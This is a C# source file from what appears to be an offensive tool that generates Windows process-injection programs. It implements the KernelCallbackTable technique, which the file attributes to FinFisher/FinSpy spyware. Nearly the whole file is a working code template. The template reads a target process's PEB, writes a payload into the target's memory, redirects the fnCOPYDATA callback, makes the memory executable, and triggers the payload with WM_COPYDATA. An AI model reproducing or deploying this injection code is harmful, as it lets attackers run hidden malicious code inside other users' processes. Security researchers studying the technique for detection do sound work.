using System.Collections.Generic;

namespace SingleDose.Techniques.Injects
{
    internal class KernelCallbackTable : ITechnique
    {
        string ITechnique.TechniqueName => "KernelCallbackTable";

        string ITechnique.TechniqueDescription => "This technique was used by the FinFisher/FinSpy surveillance spyware.";

        List<string> ITechnique.TechniqueReferences => new List<string>() 
        {
            @"https://modexp.wordpress.com/2019/05/25/windows-injection-finspy/"
        };

        bool ITechnique.IsUnsafe => false;

        bool ITechnique.IsLoader => false;

        List<string> ITechnique.Invokes => new List<string>() { "VirtualAllocEx","NtQueryInformationProcess", "ReadProcessMemory", "WriteProcessMemory_IntPtr", "SendMessage" };
        
        List<string> ITechnique.Prerequisites => new List<string>() { "ProcessID" };
        
        string ITechnique.Base => @"
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;

namespace {{NAMESPACE}}
{
    class Program
    {
        static void Main(string[] args)
        {
            {{MODE}}
            {{TRIGGER}}
            Process target = Process.GetProcessById({{PROCESSID}});
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            int retLength = 0;
            NtQueryInformationProcess(target.Handle, 0x00, out pbi, Marshal.SizeOf(pbi), out retLength);
            if (retLength == 0)
            {
                Console.WriteLine(""[!] NtQueryInformationProcess: error retrieving PEB Address. Exiting..."");
                Environment.Exit(1);
            }

            IntPtr NumBytesRead;
            byte[] bPEB = new byte[0x5e];
            ReadProcessMemory(target.Handle, pbi.PebBaseAddress, bPEB, bPEB.Length, out NumBytesRead);
            if (NumBytesRead.ToInt64() == 0)
            {
                Console.WriteLine(""[!] ReadProcessMemory: error reading PEB. Exiting..."");
                Environment.Exit(1);
            }

            GCHandle pPEB = GCHandle.Alloc(bPEB, GCHandleType.Pinned);
            PEB sPEB = (PEB)Marshal.PtrToStructure(pPEB.AddrOfPinnedObject(), typeof(PEB));
            KernelCallBackTable sKCT = new KernelCallBackTable();
            byte[] bKCT = new byte[Marshal.SizeOf(sKCT)];
            ReadProcessMemory(target.Handle, sPEB.KernelCallbackTable, bKCT, Marshal.SizeOf(sKCT), out NumBytesRead);
            if (NumBytesRead.ToInt64() == 0)
            {
                Console.WriteLine(""[!] ReadProcessMemory: error reading kernel callback table. Exiting..."");
                Environment.Exit(1);
            }
            pPEB.Free();

            GCHandle pKCT = GCHandle.Alloc(bKCT, GCHandleType.Pinned);
            sKCT = (KernelCallBackTable)Marshal.PtrToStructure(pKCT.AddrOfPinnedObject(), typeof(KernelCallBackTable));
            pKCT.Free();
            IntPtr hAlloc = VirtualAllocEx(target.Handle,IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, {{flProtect}});
            IntPtr NumBytesWritten;
            GCHandle pPayload = GCHandle.Alloc(payload, GCHandleType.Pinned);
            WriteProcessMemory(target.Handle, hAlloc, pPayload.AddrOfPinnedObject(), payload.Length, out NumBytesWritten);
            if (NumBytesWritten.ToInt64() == 0)
            {
                Console.WriteLine(""[!] WriteProcessMemory: error writing payload to process. Exiting..."");
                Environment.Exit(1);
            }
            pPayload.Free();
            
            {{PROTECT}}

            sKCT.fnCOPYDATA = hAlloc;
            IntPtr hNewKCTAlloc = VirtualAllocEx(target.Handle, IntPtr.Zero, (uint)Marshal.SizeOf(sKCT), 0x1000 | 0x2000, 0x04);
            IntPtr pUpdatedKCT = Marshal.AllocHGlobal(Marshal.SizeOf(sKCT));
            Marshal.StructureToPtr(sKCT, pUpdatedKCT, true);
            WriteProcessMemory(target.Handle, hNewKCTAlloc, pUpdatedKCT, Marshal.SizeOf(sKCT), out NumBytesWritten);
            if (NumBytesWritten.ToInt64() == 0)
            {
                Console.WriteLine(""[!] WriteProcessMemory: error writing new kernel callback table to process. Exiting..."");
                Environment.Exit(1);
            }

            int KCTOffset = 0x58;
            byte[] bNewKCTAllocAddr = BitConverter.GetBytes(hNewKCTAlloc.ToInt64());
            GCHandle pNewTableToWrite = GCHandle.Alloc(bNewKCTAllocAddr, GCHandleType.Pinned);
            WriteProcessMemory(target.Handle, (IntPtr)(pbi.PebBaseAddress.ToInt64() + KCTOffset), pNewTableToWrite.AddrOfPinnedObject(), 8, out NumBytesWritten);
            if (NumBytesWritten.ToInt64() == 0)
            {
                Console.WriteLine(""[!] WriteProcessMemory: error updating the PEB with the address of the updated kernel callback table. Exiting..."");
                Environment.Exit(1);
            }
            pNewTableToWrite.Free();

            COPYDATASTRUCT sCDS = new COPYDATASTRUCT();
            uint WM_COPYDATA = 0x004A;
            SendMessage(target.MainWindowHandle, WM_COPYDATA, IntPtr.Zero, ref sCDS);

            WriteProcessMemory(target.Handle, (IntPtr)(pbi.PebBaseAddress.ToInt64() + KCTOffset), sPEB.KernelCallbackTable, 8, out NumBytesWritten);
            if (NumBytesWritten.ToInt64() == 0)
            {
                Console.WriteLine(""[!] WriteProcessMemory: error restoring original kernel callback table. Exiting..."");
                Environment.Exit(1);
            }
        }

        {{ARGS}}
        
        #region StructsEnums

        [StructLayout(LayoutKind.Sequential)]
        private struct PEB
        {
            public byte InheritedAddressSpace;
            public byte ReadImageFileExecOptions;
            public byte BeingDebugged;
            public byte Spare;
            public IntPtr Mutant;
            public IntPtr ImageBaseAddress;
            public IntPtr Ldr;
            public IntPtr ProcessParameters;
            public IntPtr SubSystemData;
            public IntPtr ProcessHeap;
            public IntPtr FastPebLock;
            public IntPtr FastPebLockRoutine;
            public IntPtr FastPebUnlockRoutine;
            public ulong EnvironmentUpdateCount;
            public IntPtr KernelCallbackTable;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct KernelCallBackTable
        {
            public IntPtr fnCOPYDATA;
            public IntPtr fnCOPYGLOBALDATA;
            public IntPtr fnDWORD;
            public IntPtr fnNCDESTROY;
            public IntPtr fnDWORDOPTINLPMSG;
            public IntPtr fnINOUTDRAG;
            public IntPtr fnGETTEXTLENGTHS;
            public IntPtr fnINCNTOUTSTRING;
            public IntPtr fnPOUTLPINT;
            public IntPtr fnINLPCOMPAREITEMSTRUCT;
            public IntPtr fnINLPCREATESTRUCT;
            public IntPtr fnINLPDELETEITEMSTRUCT;
            public IntPtr fnINLPDRAWITEMSTRUCT;
            public IntPtr fnPOPTINLPUINT;
            public IntPtr fnPOPTINLPUINT2;
            public IntPtr fnINLPMDICREATESTRUCT;
            public IntPtr fnINOUTLPMEASUREITEMSTRUCT;
            public IntPtr fnINLPWINDOWPOS;
            public IntPtr fnINOUTLPPOINT5;
            public IntPtr fnINOUTLPSCROLLINFO;
            public IntPtr fnINOUTLPRECT;
            public IntPtr fnINOUTNCCALCSIZE;
            public IntPtr fnINOUTLPPOINT5_;
            public IntPtr fnINPAINTCLIPBRD;
            public IntPtr fnINSIZECLIPBRD;
            public IntPtr fnINDESTROYCLIPBRD;
            public IntPtr fnINSTRING;
            public IntPtr fnINSTRINGNULL;
            public IntPtr fnINDEVICECHANGE;
            public IntPtr fnPOWERBROADCAST;
            public IntPtr fnINLPUAHDRAWMENU;
            public IntPtr fnOPTOUTLPDWORDOPTOUTLPDWORD;
            public IntPtr fnOPTOUTLPDWORDOPTOUTLPDWORD_;
            public IntPtr fnOUTDWORDINDWORD;
            public IntPtr fnOUTLPRECT;
            public IntPtr fnOUTSTRING;
            public IntPtr fnPOPTINLPUINT3;
            public IntPtr fnPOUTLPINT2;
            public IntPtr fnSENTDDEMSG;
            public IntPtr fnINOUTSTYLECHANGE;
            public IntPtr fnHkINDWORD;
            public IntPtr fnHkINLPCBTACTIVATESTRUCT;
            public IntPtr fnHkINLPCBTCREATESTRUCT;
            public IntPtr fnHkINLPDEBUGHOOKSTRUCT;
            public IntPtr fnHkINLPMOUSEHOOKSTRUCTEX;
            public IntPtr fnHkINLPKBDLLHOOKSTRUCT;
            public IntPtr fnHkINLPMSLLHOOKSTRUCT;
            public IntPtr fnHkINLPMSG;
            public IntPtr fnHkINLPRECT;
            public IntPtr fnHkOPTINLPEVENTMSG;
            public IntPtr xxxClientCallDelegateThread;
            public IntPtr ClientCallDummyCallback;
            public IntPtr fnKEYBOARDCORRECTIONCALLOUT;
            public IntPtr fnOUTLPCOMBOBOXINFO;
            public IntPtr fnINLPCOMPAREITEMSTRUCT2;
            public IntPtr xxxClientCallDevCallbackCapture;
            public IntPtr xxxClientCallDitThread;
            public IntPtr xxxClientEnableMMCSS;
            public IntPtr xxxClientUpdateDpi;
            public IntPtr xxxClientExpandStringW;
            public IntPtr ClientCopyDDEIn1;
            public IntPtr ClientCopyDDEIn2;
            public IntPtr ClientCopyDDEOut1;
            public IntPtr ClientCopyDDEOut2;
            public IntPtr ClientCopyImage;
            public IntPtr ClientEventCallback;
            public IntPtr ClientFindMnemChar;
            public IntPtr ClientFreeDDEHandle;
            public IntPtr ClientFreeLibrary;
            public IntPtr ClientGetCharsetInfo;
            public IntPtr ClientGetDDEFlags;
            public IntPtr ClientGetDDEHookData;
            public IntPtr ClientGetListboxString;
            public IntPtr ClientGetMessageMPH;
            public IntPtr ClientLoadImage;
            public IntPtr ClientLoadLibrary;
            public IntPtr ClientLoadMenu;
            public IntPtr ClientLoadLocalT1Fonts;
            public IntPtr ClientPSMTextOut;
            public IntPtr ClientLpkDrawTextEx;
            public IntPtr ClientExtTextOutW;
            public IntPtr ClientGetTextExtentPointW;
            public IntPtr ClientCharToWchar;
            public IntPtr ClientAddFontResourceW;
            public IntPtr ClientThreadSetup;
            public IntPtr ClientDeliverUserApc;
            public IntPtr ClientNoMemoryPopup;
            public IntPtr ClientMonitorEnumProc;
            public IntPtr ClientCallWinEventProc;
            public IntPtr ClientWaitMessageExMPH;
            public IntPtr ClientWOWGetProcModule;
            public IntPtr ClientWOWTask16SchedNotify;
            public IntPtr ClientImmLoadLayout;
            public IntPtr ClientImmProcessKey;
            public IntPtr fnIMECONTROL;
            public IntPtr fnINWPARAMDBCSCHAR;
            public IntPtr fnGETTEXTLENGTHS2;
            public IntPtr fnINLPKDRAWSWITCHWND;
            public IntPtr ClientLoadStringW;
            public IntPtr ClientLoadOLE;
            public IntPtr ClientRegisterDragDrop;
            public IntPtr ClientRevokeDragDrop;
            public IntPtr fnINOUTMENUGETOBJECT;
            public IntPtr ClientPrinterThunk;
            public IntPtr fnOUTLPCOMBOBOXINFO2;
            public IntPtr fnOUTLPSCROLLBARINFO;
            public IntPtr fnINLPUAHDRAWMENU2;
            public IntPtr fnINLPUAHDRAWMENUITEM;
            public IntPtr fnINLPUAHDRAWMENU3;
            public IntPtr fnINOUTLPUAHMEASUREMENUITEM;
            public IntPtr fnINLPUAHDRAWMENU4;
            public IntPtr fnOUTLPTITLEBARINFOEX;
            public IntPtr fnTOUCH;
            public IntPtr fnGESTURE;
            public IntPtr fnPOPTINLPUINT4;
            public IntPtr fnPOPTINLPUINT5;
            public IntPtr xxxClientCallDefaultInputHandler;
            public IntPtr fnEMPTY;
            public IntPtr ClientRimDevCallback;
            public IntPtr xxxClientCallMinTouchHitTestingCallback;
            public IntPtr ClientCallLocalMouseHooks;
            public IntPtr xxxClientBroadcastThemeChange;
            public IntPtr xxxClientCallDevCallbackSimple;
            public IntPtr xxxClientAllocWindowClassExtraBytes;
            public IntPtr xxxClientFreeWindowClassExtraBytes;
            public IntPtr fnGETWINDOWDATA;
            public IntPtr fnINOUTSTYLECHANGE2;
            public IntPtr fnHkINLPMOUSEHOOKSTRUCTEX2;
        }

        private struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebBaseAddress;
            public UIntPtr AffinityMask;
            public int BasePriority;
            public UIntPtr UniqueProcessId;
            public UIntPtr InheritedFromUniqueProcessId;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct COPYDATASTRUCT
        {
            public IntPtr dwData;
            public int cbData;
            public string lpData;
        }
        #endregion
        {{INVOKE}}
    }
}";

        string ITechnique.VProtect => @"uint oldProtect;
           VirtualProtectEx(target.Handle, hAlloc, payload.Length, 0x20, out oldProtect);";
    }
}
